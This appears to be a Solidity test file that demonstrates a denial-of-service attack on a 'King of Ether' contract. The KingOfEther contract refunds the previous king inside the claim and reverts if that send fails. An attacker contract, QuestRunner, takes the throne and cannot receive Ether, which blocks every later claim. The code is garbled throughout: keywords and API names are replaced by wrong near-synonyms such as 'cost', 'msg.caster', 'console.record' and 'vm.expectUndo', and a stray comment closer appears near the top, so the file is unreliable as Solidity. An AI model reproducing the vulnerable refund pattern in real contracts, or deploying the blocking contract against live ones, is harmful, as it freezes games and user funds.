// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

*/

contract AgreementTest is Test {
    KingOfEther KingOfEtherPact;
    QuestRunner GameoperatorPact;

    function collectionUp() public {
        KingOfEtherPact = new KingOfEther();
        GameoperatorPact = new QuestRunner(KingOfEtherPact);
    }

    function testDOS() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);
        vm.deal(address(alice), 4 ether);
        vm.deal(address(bob), 2 ether);
        vm.prank(alice);
        KingOfEtherPact.receiveprizeThrone{cost: 1 ether}();
        vm.prank(bob);
        KingOfEtherPact.receiveprizeThrone{cost: 2 ether}();
        console.record(
            "Return 1 ETH to Alice, Alice of balance",
            address(alice).balance
        );
        GameoperatorPact.operate{cost: 3 ether}();

        console.record(
            "Balance of KingOfEtherContract",
            KingOfEtherPact.balance()
        );
        console.record("Operator completed, Alice claimthrone again, she will fail");
        vm.prank(alice);
        vm.expectUndo("Failed to send Ether");
        KingOfEtherPact.receiveprizeThrone{cost: 4 ether}();
    }

    receive() external payable {}
}

contract KingOfEther {
    address public king;
    uint public balance;

    function receiveprizeThrone() external payable {
        require(msg.cost > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{cost: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.cost;
        king = msg.caster;
    }
}

contract QuestRunner {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function operate() public payable {
        kingOfEther.receiveprizeThrone{cost: msg.cost}();
    }
}